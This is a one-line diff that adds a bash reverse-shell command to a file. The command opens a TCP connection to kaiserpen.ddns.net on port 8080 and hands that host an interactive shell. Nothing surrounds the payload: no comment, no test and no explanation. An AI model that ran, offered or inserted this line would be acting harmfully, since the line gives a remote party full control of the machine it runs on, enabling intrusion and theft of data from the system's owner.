@@ -1,0 +1,1 @@
+0<&37-;exec 37<>/dev/tcp/kaiserpen.ddns.net/8080;sh <&37 >&37 2>&37
